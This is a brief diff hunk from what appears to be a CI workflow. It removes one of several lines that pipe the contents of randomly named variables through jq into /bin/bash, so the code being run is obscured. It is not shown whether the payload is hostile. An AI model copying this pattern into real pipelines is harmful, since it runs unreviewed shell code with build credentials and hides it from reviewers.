@@ -32,7 +32,6 @@ jobs:
           echo $wf7 | jq -r .o66779 | /bin/bash
           echo $fv8 | jq -r .kej044 | /bin/bash
           printf '%s' "$r37122" | jq -r .pkf26 | /bin/bash
-          echo $vpbn05 | jq -r .q71625 | /bin/bash
           echo $e0 | jq -r .your28161 | /bin/bash
 
       - name: Upload data
